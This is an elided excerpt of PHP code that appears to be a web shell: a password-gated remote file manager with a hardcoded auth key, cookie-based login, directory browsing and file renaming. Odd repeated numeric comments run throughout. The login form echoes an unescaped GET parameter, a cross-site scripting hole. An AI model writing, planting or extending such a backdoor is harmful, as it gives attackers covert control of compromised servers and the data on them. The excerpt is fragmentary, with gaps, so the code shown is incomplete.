...
$auth_key = "0af32f16ef7c0102f1c9ba3ebd59aa3a";
...
$pass = false;
if (isset($_COOKIE['pw_name_31176'])) {
    if(($_COOKIE['pw_name_31176']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_31176'])) {
        if(($_POST['pw_name_31176']) == $auth_key) {
            setcookie("pw_name_31176", $_POST['pw_name_31176']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_31176' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1739267218576017 1739267218358648 1739267218199171 1739267218885751
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1739267218576017 1739267218358648 1739267218199171 1739267218885751
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1739267218576017 1739267218358648 1739267218199171 1739267218885751
            $name = PATH . "/" . $_GET['r'];
